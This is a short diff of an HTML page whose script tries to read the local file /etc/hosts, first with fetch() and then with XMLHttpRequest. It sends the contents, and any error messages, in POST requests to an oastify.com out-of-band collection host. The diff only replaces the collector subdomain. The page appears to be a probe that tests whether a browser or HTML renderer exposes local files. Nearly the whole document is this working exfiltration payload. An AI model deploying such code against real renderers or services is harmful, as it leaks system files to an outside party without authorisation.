@@ -5,14 +5,15 @@
     // Attempt to read via fetch()
     fetch('file:///etc/hosts')
       .then(r => r.text())
-      .then(d => fetch('https://ovnec7mtivnad010i3m0a2od74dw1upj.oastify.com/exfil', { method: 'POST', body: d }))
-      .catch(e => fetch('https://ovnec7mtivnad010i3m0a2od74dw1upj.oastify.com/error', { body: e.message }));
+      .then(d => fetch('https://424ex8pca1mh8pogdentduxxjopgda1z.oastify.com/exfil', { method: 'POST', body: d }))
+      .catch(e => fetch('https://424ex8pca1mh8pogdentduxxjopgda1z.oastify.com/error', { body: e.message }));
 
     // Fallback to XHR
     const xhr = new XMLHttpRequest();
     xhr.open('GET', 'file:///etc/hosts', true);
-    xhr.onload = () => fetch('https://ovnec7mtivnad010i3m0a2od74dw1upj.oastify.com/xhr', { body: xhr.responseText });
+    xhr.onload = () => fetch('https://424ex8pca1mh8pogdentduxxjopgda1z.oastify.com/xhr', { body: xhr.responseText });
     xhr.send();
   </script>
 </body>
 </html>
+
